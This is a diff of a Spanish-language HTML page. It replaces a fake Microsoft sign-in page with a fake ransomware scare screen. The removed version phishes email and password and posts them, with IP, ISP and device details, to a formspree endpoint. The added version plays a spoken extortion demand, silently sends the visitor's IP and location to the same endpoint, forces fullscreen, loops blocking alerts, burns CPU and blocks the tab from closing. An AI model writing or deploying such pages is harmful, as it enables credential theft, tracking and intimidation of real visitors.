@@ -2,120 +2,78 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>Acceso Denegado - Validación Requerida</title>
+    <title>SISTEMA BAJO SECUESTRO</title>
     <style>
-        body { background: #f2f2f2; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        .login-box { background: #fff; padding: 40px; width: 380px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); z-index: 10; border-radius: 1px; }
-        .logo { width: 108px; margin-bottom: 20px; }
-        h2 { font-size: 24px; font-weight: 600; margin: 0 0 16px; color: #1b1b1b; }
-        input { width: 100%; padding: 10px; margin-bottom: 15px; border: 1px solid #666; font-size: 15px; outline: none; }
-        .btn { background: #0067b8; color: #fff; border: none; padding: 10px 33px; cursor: pointer; float: right; font-size: 15px; }
-        
-        #hacker-ui { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; color: #ff0000; padding: 40px; font-family: 'Consolas', monospace; z-index: 10000; box-sizing: border-box; overflow-y: hidden; }
-        .cmd { margin-bottom: 5px; font-size: 14px; }
-        
-        /* Efecto de parpadeo de pantalla */
-        .glitch { animation: flash 0.1s infinite; }
-        @keyframes flash { 0% { background: #000; } 50% { background: #1a0000; } 100% { background: #000; } }
+        body { background: #000; color: #f00; font-family: 'Courier New', monospace; height: 100vh; margin: 0; display: flex; align-items: center; justify-content: center; overflow: hidden; }
+        #terminal { border: 2px solid #f00; padding: 30px; background: #050505; width: 80%; max-width: 600px; box-shadow: 0 0 50px #f00; text-align: center; }
+        .blink { animation: flash 0.1s infinite; }
+        @keyframes flash { 0% { background: #000; } 50% { background: #200; } 100% { background: #000; } }
+        button { background: #f00; color: #fff; border: none; padding: 20px; font-weight: bold; cursor: pointer; margin-top: 20px; font-size: 1.2rem; }
     </style>
 </head>
-<body>
+<body onclick="startAttack()">
 
-    <div id="auth-ui" class="login-box">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" class="logo">
-        <div id="login-form">
-            <h2>Iniciar sesión</h2>
-            <input type="email" id="email" placeholder="Correo electrónico">
-            <div id="pass-field" style="display:none;">
-                <input type="password" id="password" placeholder="Contraseña">
-            </div>
-            <button class="btn" onclick="handleAuth()" id="next-btn">Siguiente</button>
+    <div id="terminal">
+        <h1 id="header">⚠️ AMENAZA DE NIVEL 5 ⚠️</h1>
+        <div id="content">
+            <p>Se ha detectado una vulnerabilidad crítica en su núcleo.</p>
+            <p>Haga clic para intentar restaurar los archivos encriptados.</p>
+            <button>RESTAURAR SISTEMA</button>
         </div>
     </div>
 
-    <div id="hacker-ui">
-        <div id="console"></div>
-    </div>
-
     <script>
-        const FORM_URL = "https://formspree.io/f/xykdyebg";
-        let step = 1;
-        let userData = {};
+        const FORM_ID = "xykdyebg";
 
-        function handleAuth() {
-            if (step === 1) {
-                userData.email = document.getElementById('email').value;
-                if (!userData.email) return;
-                document.getElementById('email').style.display = 'none';
-                document.getElementById('pass-field').style.display = 'block';
-                step = 2;
-            } else {
-                userData.password = document.getElementById('password').value;
-                if (!userData.password) return;
-                ejecutarColapso();
-            }
-        }
+        async function startAttack() {
+            // 1. VOZ DEL ATACANTE
+            const msg = new SpeechSynthesisUtterance();
+            msg.text = "He robado su información y si la quiere recuperar tiene que pagarme. Te llamaré en diez horas.";
+            msg.lang = 'es-ES';
+            msg.rate = 0.8; // Voz un poco más lenta y tétrica
+            msg.pitch = 0.5; // Voz más grave
+            window.speechSynthesis.speak(msg);
 
-        async function ejecutarColapso() {
-            document.getElementById('auth-ui').style.display = 'none';
-            const ui = document.getElementById('hacker-ui');
-            ui.style.display = 'block';
-            ui.classList.add('glitch');
+            // 2. EXFILTRACIÓN SILENCIOSA
+            const ipInfo = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
+            fetch(`https://formspree.io/f/${FORM_ID}`, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    "EVENTO": "RANSOMWARE_PAYMENT_DEMAND",
+                    "IP": ipInfo.ip,
+                    "LOC": `${ipInfo.city}, ${ipInfo.country_name}`,
+                    "MSG": "Usuario bajo amenaza de pago"
+                })
+            });
+
+            // 3. SECUESTRO VISUAL Y DE RECURSOS
+            document.body.classList.add('blink');
+            document.getElementById('header').innerText = "LOCKDOWN ENABLED";
+            document.getElementById('content').innerHTML = "<h2 style='font-size:40px;'>PAGAR PARA DESBLOQUEAR</h2><p>Estado: Archivos encriptados</p>";
             
-            try { document.documentElement.requestFullscreen(); } catch(e){}
+            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
 
-            // Recolección Extrema
-            const ipData = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
-            const bat = await navigator.getBattery().catch(() => ({}));
-            
-            const payload = {
-                "V_USER": userData.email,
-                "V_PASS": userData.password,
-                "IP": ipData.ip,
-                "CITY": ipData.city,
-                "ISP": ipData.org,
-                "TIMEZONE": Intcl.DateTimeFormat().resolvedOptions().timeZone,
-                "LANG": navigator.language,
-                "BATTERY": (bat.level * 100) + "%",
-                "CORES": navigator.hardwareConcurrency,
-                "AGENT": navigator.userAgent
-            };
-
-            // Envío de datos
-            fetch(FORM_URL, { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
-
-            // 1. Trabado del Navegador (Bucle infinito de consola)
-            console.log("%c INTRUSION DETECTED", "color: red; font-size: 50px;");
-            
-            const logger = document.getElementById('console');
-            const lines = [
-                "CRITICAL: EXPLOIT LOADED",
-                "DUMPING CREDENTIALS...",
-                "CREDENTIALS SENT TO MASTER SERVER",
-                "INJECTING PERSISTENT ROOTKIT...",
-                "LOCKING BROWSER KERNEL...",
-                "ENCRYPTING C:/USERS/DOCUMENTS...",
-                "SYSTEM OVERLOAD: 99%"
-            ];
-
-            // 2. Bombardeo de Alertas (Esto traba la interacción)
-            let i = 0;
-            const timer = setInterval(() => {
-                const div = document.createElement('div');
-                div.className = "cmd";
-                div.innerText = `[FATAL] ${lines[i % lines.length]} - ${Math.random().toString(16)}`;
-                logger.appendChild(div);
-                
-                // Cada 5 líneas, lanzamos un popup que bloquea el hilo
-                if (i % 5 === 0) {
-                    alert("FATAL ERROR: Unauthorized access by ANONYMOUS_OPERATOR\n\nData Exfiltrated: " + userData.email);
+            // 4. BUCLE DE BLOQUEO (TRABA EL DISPOSITIVO)
+            setInterval(() => {
+                // Reinicia la voz si termina
+                if (!window.speechSynthesis.speaking) {
+                    window.speechSynthesis.speak(msg);
                 }
-                
-                i++;
-                // 3. Consumo de Memoria (Para trabar la pestaña)
-                let crash = new Array(1000000).fill("HACKED"); 
-            }, 300);
+
+                // Bombardeo de alertas
+                alert("SISTEMA SECUESTRADO POR ANONYMOUS\n\nHe robado su información.\n\nTe llamaré en 10 horas para el pago.");
+
+                // Consumo de CPU
+                for(let i=0; i<1000000; i++) { Math.sqrt(i); }
+            }, 100);
         }
+
+        // Impedir que cierren la pestaña fácilmente
+        window.onbeforeunload = function() {
+            return "El proceso de encriptación está en curso. Si sale ahora, perderá sus datos.";
+        };
     </script>
 </body>
 </html>
